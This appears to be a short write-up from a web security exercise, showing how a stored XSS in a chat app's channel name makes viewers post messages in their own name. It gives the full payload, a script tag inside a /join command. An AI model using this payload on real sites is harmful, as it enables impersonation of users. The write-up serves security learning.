Q2 - Post in others name (using XSS)
I noticed in code.js that each time the page refreshes, the channels and messages are refreshed as well :
function Refresh() {
  RefreshChannels(true);
  RefreshMessages(true);
  ...
  
Therefore I created a new channel (using the /join command inside a message I posted from edward profile)
so that each time the page refreshes, this channel will also refresh and because I put a script in it, it will render this script :)

SOLUTION:
#general_spam

/join #<script>$.post("/post", {'channel': "#general-spam",'message': "Good morning!"})</script>
